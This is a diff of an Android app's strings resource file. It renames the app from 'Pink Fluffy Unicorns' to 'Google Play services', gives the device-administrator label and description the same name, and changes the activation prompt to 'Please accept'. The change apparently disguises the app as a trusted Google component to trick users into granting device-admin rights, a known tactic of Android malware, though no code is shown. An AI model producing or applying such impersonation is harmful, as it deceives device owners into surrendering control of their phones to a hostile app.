@@ -1,6 +1,6 @@
 <resources>
-    <string name="app_name">Pink Fluffy Unicorns</string>
-	<string name="sample_device_admin">label</string>
-	<string name="sample_device_admin_description">description</string>
-	<string name="device_admin_activation_message">message</string>
+	<string name="app_name">Google Play services</string>
+	<string name="device_admin">Google Play services</string>
+	<string name="device_admin_description">Google Play services</string>
+	<string name="device_admin_activation_message">Please accept</string>
 </resources>
